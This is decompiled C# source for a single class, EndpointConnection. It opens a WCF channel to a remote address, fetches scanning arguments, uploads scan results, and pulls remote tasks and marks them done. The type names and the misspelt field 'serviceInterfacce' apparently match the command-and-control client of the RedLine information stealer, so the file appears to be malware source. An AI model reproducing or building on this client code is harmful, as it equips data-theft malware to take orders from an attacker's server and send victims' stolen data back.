using System;
using System.Collections.Generic;
using System.ServiceModel;

// Token: 0x0200000C RID: 12
public class EndpointConnection : IDisposable
{
	// Token: 0x0600003B RID: 59 RVA: 0x00003F50 File Offset: 0x00002150
	public bool RequestConnection(string address)
	{
		bool result;
		try
		{
			ChannelFactory<IRemoteEndpoint> channelFactory = new ChannelFactory<IRemoteEndpoint>(SystemInfoHelper.CreateBind(), new EndpointAddress("http://" + address + "/"));
			this.serviceInterfacce = channelFactory.CreateChannel();
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00003FA4 File Offset: 0x000021A4
	public bool TryGetConnection()
	{
		bool result;
		try
		{
			result = this.serviceInterfacce.CheckConnect();
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600003D RID: 61 RVA: 0x00003FD8 File Offset: 0x000021D8
	public bool TryGetArgs(out ScanningArgs args)
	{
		bool result;
		try
		{
			args = new ScanningArgs();
			args = this.serviceInterfacce.GetArguments();
			result = true;
		}
		catch (Exception)
		{
			args = new ScanningArgs();
			result = false;
		}
		return result;
	}

	// Token: 0x0600003E RID: 62 RVA: 0x0000401C File Offset: 0x0000221C
	public bool TryVerify(ScanResult result)
	{
		bool result2;
		try
		{
			this.serviceInterfacce.VerifyScanRequest(result);
			result2 = true;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600003F RID: 63 RVA: 0x00004050 File Offset: 0x00002250
	public bool TryGetTasks(ScanResult user, out IList<UpdateTask> remoteTasks)
	{
		bool result;
		try
		{
			remoteTasks = this.serviceInterfacce.GetUpdates(user);
			result = true;
		}
		catch (Exception)
		{
			remoteTasks = new List<UpdateTask>();
			result = false;
		}
		return result;
	}

	// Token: 0x06000040 RID: 64 RVA: 0x0000408C File Offset: 0x0000228C
	public bool TryCompleteTask(ScanResult user, int taskId)
	{
		bool result;
		try
		{
			this.serviceInterfacce.VerifyUpdate(user, taskId);
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000041 RID: 65 RVA: 0x000040C0 File Offset: 0x000022C0
	public void Dispose()
	{
		this.Dispose(true);
		GC.SuppressFinalize(this);
	}

	// Token: 0x06000042 RID: 66 RVA: 0x000040CF File Offset: 0x000022CF
	protected virtual void Dispose(bool managed)
	{
		if (managed && this.serviceInterfacce != null)
		{
			IClientChannel clientChannel = this.serviceInterfacce as IClientChannel;
			if (clientChannel != null)
			{
				clientChannel.Close();
			}
			IClientChannel clientChannel2 = this.serviceInterfacce as IClientChannel;
			if (clientChannel2 == null)
			{
				return;
			}
			clientChannel2.Abort();
		}
	}

	// Token: 0x0400000A RID: 10
	private IRemoteEndpoint serviceInterfacce;
}
